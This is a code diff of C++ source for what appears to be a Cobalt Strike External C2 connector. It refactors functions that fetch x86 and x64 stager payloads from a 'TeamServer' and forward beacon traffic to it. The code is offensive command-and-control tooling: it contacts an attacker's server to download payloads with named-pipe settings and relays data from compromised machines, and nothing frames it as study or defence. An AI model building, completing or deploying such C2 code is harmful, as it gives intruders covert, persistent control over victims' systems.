@@ -71,19 +71,8 @@ void send_frame(SOCKET my_socket, char* buffer, int length) {
 }
 
 //I'm being lazy so we have 2 funcs, one for x86 and one for x64
-std::vector<uint8_t> getx64Payload() {
+std::vector<uint8_t> getx64Payload(SOCKET socket_extc2) {
 	std::cout << "[?] Getting x64 from TeamServer" << std::endl;
-	struct sockaddr_in 	sock;
-	sock.sin_family = AF_INET;
-	sock.sin_addr.s_addr = inet_addr(TeamServer::address.c_str());
-	sock.sin_port = htons(TeamServer::port);
-
-	SOCKET socket_extc2 = socket(AF_INET, SOCK_STREAM, 0);
-	if (connect(socket_extc2, (struct sockaddr*)&sock, sizeof(sock))) {
-		printf("Could not connect to %s:%d\n", TeamServer::address.c_str(), TeamServer::port);
-		exit(0);
-		//return;
-	}
 
 	send_frame(socket_extc2, (char*)"arch=x64", 8);
 	send_frame(socket_extc2, (char*)"pipename=somepipe", 17);
@@ -106,19 +95,8 @@ std::vector<uint8_t> getx64Payload() {
 	return payload;
 };
 
-std::vector<uint8_t> getx86Payload() {
+std::vector<uint8_t> getx86Payload(SOCKET socket_extc2) {
 	std::cout << "[?] Getting x86 from TeamServer" << std::endl;
-	struct sockaddr_in 	sock;
-	sock.sin_family = AF_INET;
-	sock.sin_addr.s_addr = inet_addr(TeamServer::address.c_str());
-	sock.sin_port = htons(TeamServer::port);
-
-	SOCKET socket_extc2 = socket(AF_INET, SOCK_STREAM, 0);
-	if (connect(socket_extc2, (struct sockaddr*)&sock, sizeof(sock))) {
-		printf("Could not connect to %s:%d\n", TeamServer::address.c_str(), TeamServer::port);
-		exit(0);
-		//return;
-	}
 
 	send_frame(socket_extc2, (char*)"arch=x86", 8);
 	send_frame(socket_extc2, (char*)"pipename=foobar", 15);
@@ -142,19 +120,19 @@ std::vector<uint8_t> getx86Payload() {
 
 //dingus im using the wrong socket
 
-std::vector<uint8_t> forwardToTeamserver(std::vector<uint8_t> dataForTeamserver) {
+std::vector<uint8_t> forwardToTeamserver(std::vector<uint8_t> dataForTeamserver, SOCKET socket_extc2) {
 	std::cout << "[?] Forwarding data to TeamServer" << std::endl;
-	struct sockaddr_in 	sock;
-	sock.sin_family = AF_INET;
-	sock.sin_addr.s_addr = inet_addr(TeamServer::address.c_str());
-	sock.sin_port = htons(TeamServer::port);
+	//struct sockaddr_in 	sock;
+	//sock.sin_family = AF_INET;
+	//sock.sin_addr.s_addr = inet_addr(TeamServer::address.c_str());
+	//sock.sin_port = htons(TeamServer::port);
 
-	SOCKET socket_extc2 = socket(AF_INET, SOCK_STREAM, 0);
-	if (connect(socket_extc2, (struct sockaddr*)&sock, sizeof(sock))) {
-		printf("Could not connect to %s:%d\n", TeamServer::address.c_str(), TeamServer::port);
-		exit(0);
-		//return;
-	}
+	//SOCKET socket_extc2 = socket(AF_INET, SOCK_STREAM, 0);
+	//if (connect(socket_extc2, (struct sockaddr*)&sock, sizeof(sock))) {
+	//	printf("Could not connect to %s:%d\n", TeamServer::address.c_str(), TeamServer::port);
+	//	exit(0);
+	//	//return;
+	//}
 
 	//send adn rec frame as needed
 
